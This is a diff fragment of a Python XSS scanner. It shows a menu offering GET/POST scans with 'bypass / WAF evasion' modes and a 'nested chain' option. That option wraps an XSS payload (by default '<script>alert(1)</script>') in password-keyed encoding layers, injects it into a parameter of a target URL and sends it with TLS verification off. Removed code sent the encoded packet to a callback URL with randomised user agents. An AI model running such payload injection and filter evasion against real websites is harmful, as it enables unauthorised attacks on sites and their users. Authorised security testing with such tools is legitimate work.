-    print_header("Option 7 - Nested Chain (per-layer passwords)")
-    print(f"{C.D}Outer packet carries the next password: A holds B, B holds C, ...{C.R}\n")
-
-    raw_n = input(f"{C.NEO}How many layers / packets? (1-12){C.R}: ").strip()
-    try:
-        n = int(raw_n)
-    except ValueError:
-        n = 1
-    n = max(1, min(12, n))
-
+    n = int(prompt("Layers", "2") or "2")
     layers = []
-    print(f"\n{C.GLD}Enter layers OUTER -> INNER (first = A / outer){C.R}")
-    for i in range(n):
-        print(f"\n{C.PUR}--- Layer {i+1}/{n} ---{C.R}")
-        name = input(f"  {C.NEO}Name{C.R} {C.D}(e.g. la / nm / mna){C.R}: ").strip() or f"L{i+1}"
-        pw = input(f"  {C.NEO}Password for [{name}]{C.R}: ").strip()
-        if not pw:
-            print(f"{C.CRM}[!] empty password — abort{C.R}")
-            return
-        payload = input(f"  {C.NEO}Payload for [{name}]{C.R}: ").strip() or name
-        key_fp = hashlib.sha256(hash_password(pw)).hexdigest()
-        print(f"  {C.GRN}[+][{name}] key fingerprint:{C.R} {key_fp[:32]}...")
-        print(f"  {C.CYN}payload:{C.R} {_color_payload(payload[:120], i)}")
-        layers.append({"name": name, "password": pw, "payload": payload})
-
-    print(f"\n{C.NEO}Building hierarchy...{C.R}")
+    for i in range(max(1, min(5, n))):
+        pw = prompt(f"Password layer {i+1}", f"pass{i+1}")
+        layers.append(pw)
+    plain = prompt("Innermost payload", "<script>alert(1)</script>")
+    url = normalize_url(prompt("Target URL"))
+    param = prompt("Param", "q")
     try:
-        outer, meta = build_hierarchical_chain(layers, compress=True)
+        data: Any = plain.encode()
+        for i, pw in enumerate(reversed(layers)):
+            c = ChainAdvanced(pw)
+            data = c.encode(data if isinstance(data, bytes) else json.dumps(data).encode())
+            status_line(f"layer {len(layers)-i} encoded", "ok")
+        blob = json.dumps(data) if isinstance(data, dict) else str(data)
+        if not params_from_url(url):
+            url = url + ("&" if "?" in url else "?") + f"{param}=x"
+        target = inject_param(url, param, blob)
+        r = requests.get(target, timeout=12, verify=False)
+        status_line(f"sent status={r.status_code}", "ok")
+        path = os.path.join(reports_dir(), f"chain_{int(time.time())}.json")
+        with open(path, "w", encoding="utf-8") as f:
+            json.dump({"url": target, "layers": len(layers), "packet": data}, f, indent=2, default=str)
+        status_line(f"saved {path}", "ok")
     except Exception as e:
-        print(f"{C.CRM}[!] Build failed: {e}{C.R}")
-        return
-
-    print(f"\n{C.B}{'='*55}{C.R}")
-    print(f"{C.B}  Layer map (OUTER -> INNER){C.R}")
-    print(f"{C.B}{'='*55}{C.R}")
-    for i, m in enumerate(meta):
-        print(f"  {C.GLD}{i}{C.R} [{_color_payload(m['name'], i)}]  "
-              f"stages={len(m['stages'])}  d_len={len(m['d'])}  "
-              f"fp={m['key_fp'][:16]}...")
-        if i < len(meta) - 1:
-            print(f"      {C.YEL}-> holds password of [{meta[i+1]['name']}]{C.R}")
-
-    print(f"\n{C.B}{'='*55}{C.R}")
-    print(f"{C.B}  Decode Verification{C.R}")
-    print(f"{C.B}{'='*55}{C.R}\n")
-    try:
-        recovered = peel_hierarchical(layers[0]["password"], outer["salt"], outer["d"])
-        for rec in recovered:
-            print(f"{C.PUR}[{rec['name']}]{C.R}")
-            for si, st in enumerate(rec["stages"]):
-                print(f"  Stage {si}: {_color_payload(st, si)}")
-            print()
-        print(f"{C.GRN}[+] Peel OK with OUTER password only — {len(recovered)} layers{C.R}")
-    except Exception as e:
-        print(f"{C.CRM}[!] Peel failed: {e}{C.R}")
-        return
-
-    print(f"\n{C.GRN}[+] Outer d:{C.R} {C.D}{outer['d'][:96]}{'...' if len(outer['d'])>96 else ''}{C.R}")
-    print(f"{C.GRN}[+] Outer salt (s):{C.R} {outer['salt']}")
-    print(f"{C.GRN}[+] Outer key fp:{C.R} {outer['key_fp']}")
-
-    if input(f"\n{C.NEO}Send outer packet via GET? (y/n){C.R}: ").strip().lower() != "y":
-        print(f"{C.YEL}[!] Local only — not sent{C.R}")
-        return
-    url = input(f"{C.NEO}Callback URL{C.R}: ").strip()
-    if not url.startswith(("http://", "https://")):
-        print(f"{C.CRM}[!] bad URL{C.R}")
-        return
-    params = {
-        "c": "aac2-nest",
-        "s": outer["salt"],
-        "d": outer["d"],
-        "l": f"nest{len(meta)}",
-        "fp": outer["key_fp"][:16],
-        "n": layers[0]["name"],
-    }
-    try:
-        r = requests.get(
-            url, params=params, timeout=20, verify=False, allow_redirects=False,
-            headers={"User-Agent": random.choice(USER_AGENTS)},
-        )
-        print(f"{C.GRN}[+] Sent HTTP {r.status_code}  d_len={len(outer['d'])}{C.R}")
-    except Exception as e:
-        print(f"{C.CRM}[!] Send failed: {str(e)[:120]}{C.R}")
+        status_line(str(e), "err")
+    pause()
 
 
-
+# ── main menu ────────────────────────────────────────────────────────────────
 def run():
     while True:
         banner()
-        print(f"{C.PUR}+{'-'*62}+{C.R}")
-        print(f"{C.PUR}|{C.R}  {C.GLD}1{C.R}  {C.NEO}Scan GET  (normal){C.R}                     {C.PUR}|{C.R}")
-        print(f"{C.PUR}|{C.R}  {C.GLD}2{C.R}  {C.NEO}Scan POST (normal){C.R}                     {C.PUR}|{C.R}")
-        print(f"{C.PUR}|{C.R}  {C.GLD}3{C.R}  {C.YEL}Scan GET  (BYPASS){C.R}                     {C.PUR}|{C.R}")
-        print(f"{C.PUR}|{C.R}  {C.GLD}4{C.R}  {C.YEL}Scan POST (BYPASS){C.R}                     {C.PUR}|{C.R}")
-        print(f"{C.PUR}|{C.R}  {C.GLD}5{C.R}  {C.GRN}Advanced Engine GET  (xsspor){C.R}           {C.PUR}|{C.R}")
-        print(f"{C.PUR}|{C.R}  {C.GLD}6{C.R}  {C.GRN}Advanced Engine POST (xsspor){C.R}           {C.PUR}|{C.R}")
-        print(f"{C.PUR}|{C.R}  {C.GLD}7{C.R}  {C.PUR}Nested Chain (per-layer passwords){C.R}      {C.PUR}|{C.R}")
-        print(f"{C.PUR}|{C.R}  {C.GLD}8{C.R}  {C.CYN}Chain local self-test{C.R}                  {C.PUR}|{C.R}")
-        print(f"{C.PUR}|{C.R}  {C.GLD}9{C.R}  {C.CYN}Chain manual GET{C.R}                        {C.PUR}|{C.R}")
-        print(f"{C.PUR}|{C.R}  {C.GLD}0{C.R}  {C.CRM}Exit{C.R}                                   {C.PUR}|{C.R}")
-        print(f"{C.PUR}+{'-'*62}+{C.R}")
-        print(f"\n{C.GLD}{C.B}>>{C.R} ", end="")
-        c = input().strip()
-
-        if c == "0":
-            print(f"{C.CRM}Bye{C.R}"); break
-        elif c == "1":
-            run_scan("GET", adaptive=False)
-        elif c == "2":
-            run_scan("POST", adaptive=False)
-        elif c == "3":
-            run_scan("GET", adaptive=True)
-        elif c == "4":
-            run_scan("POST", adaptive=True)
-        elif c == "5":
+        box("XSS Scanner", [
+            ("1", "Scan GET   · normal payloads"),
+            ("2", "Scan POST  · normal payloads"),
+            ("3", "Scan GET   · bypass / WAF evasion"),
+            ("4", "Scan POST  · bypass / WAF evasion"),
+            ("5", "Advanced engine GET  (xsspor)"),
+            ("6", "Advanced engine POST (xsspor)"),
+            ("7", "Nested chain (per-layer passwords)"),
+            ("8", "Chain local self-test"),
+            ("9", "Chain manual GET"),
+            ("0", "Back"),
+        ])
+        choice = prompt(">>", "0")
+        if choice == "0":
+            return
+        elif choice == "1":
+            run_scan("GET", bypass=False)
+        elif choice == "2":
+            run_scan("POST", bypass=False)
+        elif choice == "3":
+            run_scan("GET", bypass=True)
+        elif choice == "4":
+            run_scan("POST", bypass=True)
+        elif choice == "5":
             run_advanced_engine("GET")
-        elif c == "6":
+        elif choice == "6":
             run_advanced_engine("POST")
-        elif c == "7":
+        elif choice == "7":
             send_nested_payloads_chain()
-            input(f"\n{C.D}Enter...{C.R}")
-        elif c == "8":
+        elif choice == "8":
             chain_self_test()
-            input(f"\n{C.D}Enter...{C.R}")
-        elif c == "9":
+        elif choice == "9":
             send_manual_chain()
-            input(f"\n{C.D}Enter...{C.R}")
         else:
-            print(f"{C.CRM}[!] Invalid{C.R}"); time.sleep(1)
+            status_line("invalid option", "err")
+            time.sleep(0.6)
 
 
 if __name__ == "__main__":
     try:
         run()
     except KeyboardInterrupt:
-        print(f"\n{C.CRM}Bye{C.R}")
+        print(f"\n{C.CRM}bye{C.R}")
